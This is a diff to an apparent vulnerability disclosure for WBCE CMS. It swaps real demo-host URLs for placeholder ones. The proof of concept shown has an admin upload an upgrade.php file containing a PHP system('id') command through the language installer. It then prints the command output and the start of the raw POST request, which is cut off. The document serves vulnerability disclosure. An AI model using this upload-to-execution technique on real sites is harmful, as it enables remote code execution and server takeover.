@@ -14,8 +14,8 @@
 ### POC:
 
 1. Login with admin credentials and click on Add-ons.
-2. Navigate to Language > Install Language > [Installation Link](https://demos6.softaculous.com/WBCE_CMSgn4fqnl8mv/admin/languages/index.php).
-3. Upload `upgrade.php` with the content `<?php echo system('id'); ?>`, then click install > [Install Link](https://demos6.softaculous.com/WBCE_CMSgn4fqnl8mv/admin/languages/install.php).
+2. Navigate to Language > Install Language >https://demos6.demo.com/admin/languages/index.php
+3. Upload `upgrade.php` with the content `<?php echo system('id'); ?>`, then click install > https://demos6.demo.com/admin/languages/install.php
 4. The command execution result will be displayed: 
 
 uid=1000(soft) gid=1000(soft) groups=1000(soft)
@@ -26,14 +26,14 @@ uid=1000(soft) gid=1000(soft) groups=1000(soft)
 ### Post Request:
 
 ```http
-POST /WBCE_CMSgn4fqnl8mv/admin/languages/install.php HTTP/1.1
-Host: demos6.softaculous.com
+POST /admin/languages/install.php HTTP/1.1
+Host: demos6.demo.com
 Cookie: [cookie values]
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Referer: https://demos6.softaculous.com/WBCE_CMSgn4fqnl8mv/admin/languages/index.php
+Referer: https://demos6.demo.com/admin/languages/index.php
 Content-Type: multipart/form-data; boundary=---------------------------86020911415982314764024459
 Content-Length: 522
 Origin: https://demos6.softaculous.com
